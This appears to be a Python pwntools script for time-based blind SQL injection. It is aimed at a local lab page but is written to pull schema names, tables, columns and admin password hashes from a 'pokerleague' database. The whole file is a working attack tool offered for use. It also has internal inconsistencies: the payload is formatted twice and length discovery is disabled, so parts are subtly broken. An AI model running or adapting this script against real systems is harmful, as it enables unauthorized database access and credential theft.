from pwn import *
import requests, signal, pdb, sys, time, string
import concurrent.futures
import threading
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

lock = threading.Lock()

sleep_time = 5
num_workers = 5
characters = string.ascii_lowercase + string.digits + "-_/"
target_discover_length = 0
target_url = "http://localhost:8080/Less-8/?id="
target_discover = "database()"
target_discover = "(select group_concat(schema_name) from information_schema.schemata)"
target_discover = "(select group_concat(table_name SEPARATOR '-') from information_schema.tables where table_schema='pokerleague')"
target_discover = "(select group_concat(column_name) from information_schema.columns where table_schema='pokerleague' and table_name='pokermax_admin')"
target_discover = "(select group_concat(password) from pokerleague.pokermax_admin)"

def sigint_handler():
    print("Exiting...")

signal.signal(signal.SIGINT, sigint_handler)

payload = " and if(substring({target_discover},{pos},1)='{c}', (select * from (select(sleep({sleep_time})))a),1)-- -".format(target_discover=target_discover, sleep_time=sleep_time, pos="0", c="1")

s = requests.session()
s.verify=False
#s.cookies.set("nagiosxi", "3de2pc42hoibgbtrns1pqfg1fm")

def discover_length():
    p_length = log.progress("Getting string length")
    pLength = log.progress("Request:".format(target_discover))
    maxLength = 255
    for l in range(0, maxLength):
        pLength.status("{0}/{1}".format(l, maxLength))
        start_time = time.time()

        r = s.get(target_url+f"2' and LENGTH(database())={l}")

        end_time = time.time()

        #execution_time = end_time - start_time
        #if execution_time > sleep_time:
        #    return l
        if "You are in" in r.text:
            return l
    pLength.success()
    p_length.success(str(target_discover_length))

#target_discover_length = discover_length()


p2 = log.progress("Discovering [{0}]".format(target_discover))

p2.status("Discovering [{0}] ({1} chars)".format(target_discover, str(target_discover_length)))

result = "*" * target_discover_length



def discover_char(pos):
    global result
    global p2
    for c in characters:
        start_time = time.time()

        post_data = {
            'op': 'adminlogin',
            'username': payload.format(pos, c),
            'password': 'test'

        }

        r = requests.post(target_url, data=post_data)

        end_time = time.time()

        execution_time = end_time - start_time
        if execution_time > sleep_time:
            result = result[:pos-1] + c + result[pos:]
            p2.status(result)
            return c,pos

def inject():
    p1 = log.progress("Brute force")
    p1.status("Starting bruteforce...")

    with concurrent.futures.ThreadPoolExecutor(max_workers=num_workers) as executor:
        results = [executor.submit(discover_char, i) for i in range(target_discover_length + 1)]

        for future in concurrent.futures.as_completed(results):
            res = future.result()

    p1.success()

if __name__ == '__main__':
    inject()

